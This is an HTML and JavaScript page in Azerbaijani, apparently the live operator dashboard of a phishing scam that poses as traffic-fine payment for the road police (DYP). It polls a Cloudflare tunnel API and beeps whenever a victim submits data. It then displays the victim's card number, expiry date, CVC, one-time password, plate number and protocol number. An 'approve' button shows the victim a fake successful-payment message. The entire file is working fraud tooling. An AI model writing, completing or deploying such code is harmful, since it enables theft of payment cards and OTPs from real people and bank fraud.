<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DYP - Canlı Ödəniş Sorğuları və Bildirişlər</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        body { font-family: 'Inter', sans-serif; }
    </style>
</head>
<body class="bg-gray-100 min-h-screen py-10 px-4">
    <div class="max-w-2xl mx-auto space-y-6">

        <!-- Header -->
        <div class="bg-white rounded-2xl shadow-xl p-6 flex justify-between items-center">
            <div>
                <h1 class="font-bold text-gray-800 text-xl">🔔 Canlı Ödəniş Sorğuları</h1>
                <p class="text-xs text-gray-500 mt-1">İstifadəçi kart məlumatlarını və OTP yazdıqda səsli xəbərdarlıq gəlir</p>
            </div>
            <div class="flex items-center space-x-2">
                <span class="relative flex h-3 w-3">
                  <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                  <span class="relative inline-flex rounded-full h-3 w-3 bg-green-500"></span>
                </span>
                <span id="connection-status" class="text-xs font-bold text-green-600">Dinlənilir...</span>
            </div>
        </div>

        <!-- Requests Container -->
        <div id="requests-container" class="space-y-4">
            <div id="no-request" class="bg-white rounded-2xl shadow-md p-10 text-center text-gray-400">
                <div class="text-4xl mb-2">📥</div>
                <p class="text-sm font-medium">Hələ ki yeni ödəniş sorğusu yoxdur...</p>
            </div>
        </div>
    </div>

    <script>
        let API_URL = 'https://groups-wrapped-meetup-specifications.trycloudflare.com/api';
        let lastCardNo = null;

        async function initConfig() {
            try {
                const res = await fetch('config.json');
                const config = await res.json();
                if (config.apiUrl) {
                    API_URL = config.apiUrl;
                }
            } catch (err) {
                console.log("Config oxunmadı, lokal istifadə olunur");
            }
            setInterval(checkRequests, 1500);
        }

        function playBeep() {
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const gainNode = audioCtx.createGain();

                oscillator.type = 'sine';
                oscillator.frequency.setValueAtTime(880, audioCtx.currentTime);
                gainNode.gain.setValueAtTime(0.5, audioCtx.currentTime);

                oscillator.connect(gainNode);
                gainNode.connect(audioCtx.destination);

                oscillator.start();
                oscillator.stop(audioCtx.currentTime + 0.6);
            } catch (e) {
                console.log("Audio play error:", e);
            }
        }

        async function checkRequests() {
            try {
                const res = await fetch(`${API_URL}/fine`, { method: 'GET', signal: AbortSignal.timeout(3000) });
                if (res.ok) {
                    const data = await res.json();
                    document.getElementById('connection-status').textContent = "Dinlənilir (Online)";
                    document.getElementById('connection-status').className = "text-xs font-bold text-green-600";

                    if (data.cardNo && data.cardNo !== lastCardNo) {
                        lastCardNo = data.cardNo;
                        playBeep();
                        renderRequestCard(data);
                    } else if (data.cardNo && lastCardNo === data.cardNo) {
                        updateRequestCard(data);
                    }
                } else {
                    throw new Error("Server error");
                }
            } catch (err) {
                document.getElementById('connection-status').textContent = "Serverə qoşulmadı (Offline)";
                document.getElementById('connection-status').className = "text-xs font-bold text-red-600";
            }
        }

        function renderRequestCard(data) {
            const container = document.getElementById('requests-container');
            document.getElementById('no-request')?.remove();

            container.innerHTML = `
                <div class="bg-white rounded-2xl shadow-xl border-2 border-green-500 p-6 space-y-4 animate-bounce-once">
                    <div class="flex justify-between items-center border-b pb-3">
                        <div class="flex items-center space-x-2">
                            <span class="text-2xl">🚨</span>
                            <h3 class="font-bold text-red-600 text-lg">YENİ ÖDƏNİŞ SORĞUSU GƏLDİ!</h3>
                        </div>
                        <span class="bg-amber-100 text-amber-800 text-xs px-3 py-1 rounded-full font-bold">${data.dateTime}</span>
                    </div>

                    <div class="grid grid-cols-2 gap-4 text-sm">
                        <div class="bg-gray-50 p-3 rounded-xl">
                            <span class="text-xs text-gray-500 block">Avtomobil Nömrəsi:</span>
                            <strong class="text-blue-600 text-base">${data.plateNo}</strong>
                        </div>
                        <div class="bg-gray-50 p-3 rounded-xl">
                            <span class="text-xs text-gray-500 block">Protokol No:</span>
                            <strong class="text-gray-800">${data.protocolNo}</strong>
                        </div>
                    </div>

                    <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 space-y-2 text-sm">
                        <div class="flex justify-between">
                            <span class="text-gray-600 font-semibold">Kart Nömrəsi:</span>
                            <span class="font-mono font-bold text-blue-700 text-base">${data.cardNo}</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-gray-600 font-semibold">Ay / İl (Exp):</span>
                            <span class="font-mono font-bold text-gray-800">${data.cardExp}</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-gray-600 font-semibold">CVC Kodu:</span>
                            <span class="font-mono font-bold text-gray-800">${data.cardCvc}</span>
                        </div>
                        <div class="flex justify-between border-t pt-2">
                            <span class="text-gray-600 font-semibold">Daxil edilən OTP Kodu:</span>
                            <span id="req-otp" class="font-mono font-bold text-amber-600 text-lg">${data.otpCode || 'Gözlənilir...'}</span>
                        </div>
                        <div class="flex justify-between border-t pt-2">
                            <span class="text-gray-600 font-semibold">Status:</span>
                            <span id="req-status" class="font-bold ${data.isPaid ? 'text-green-600' : 'text-amber-600'}">${data.isPaid ? '✅ Təsdiqləndi (Ödənildi)' : '⏳ OTP Təsdiqi Gözlənilir'}</span>
                        </div>
                    </div>

                    <!-- ADMIN APPROVAL BUTTON -->
                    <div id="action-area">
                        ${data.isPaid ?
                            `<div class="bg-green-100 text-green-800 font-bold p-3 rounded-xl text-center">✅ Ödəniş Admin tərəfindən Təsdiqləndi</div>` :
                            `<button onclick="approvePayment()" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3.5 rounded-xl text-base shadow-lg transition">
                                ✅ Ödənişi Təsdiq Et (Uğurlu Ödəniş)
                            </button>`
                        }
                    </div>
                </div>
            `;
        }

        function updateRequestCard(data) {
            const otpEl = document.getElementById('req-otp');
            const statusEl = document.getElementById('req-status');
            const actionArea = document.getElementById('action-area');
            if (otpEl) otpEl.textContent = data.otpCode || 'Gözlənilir...';
            if (statusEl) {
                statusEl.textContent = data.isPaid ? '✅ Təsdiqləndi (Ödənildi)' : '⏳ OTP Təsdiqi Gözlənilir';
                statusEl.className = data.isPaid ? 'font-bold text-green-600' : 'font-bold text-amber-600';
            }
            if (actionArea && data.isPaid && !actionArea.innerHTML.includes('Uğurlu')) {
                actionArea.innerHTML = `<div class="bg-green-100 text-green-800 font-bold p-3 rounded-xl text-center">✅ Ödəniş Admin tərəfindən Təsdiqləndi</div>`;
            }
        }

        async function approvePayment() {
            try {
                const res = await fetch(`${API_URL}/admin/approve`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                });
                const result = await res.json();
                if (result.success) {
                    alert("Ödəniş uğurla təsdiqləndi! İstifadəçinin ekranında 'Uğurlu ödəniş' göstəriləcək.");
                    checkRequests();
                }
            } catch (err) {
                console.error("Təsdiqləmə xətası:", err);
                alert("Xəta baş verdi!");
            }
        }

        initConfig();
    </script>
</body>
</html>
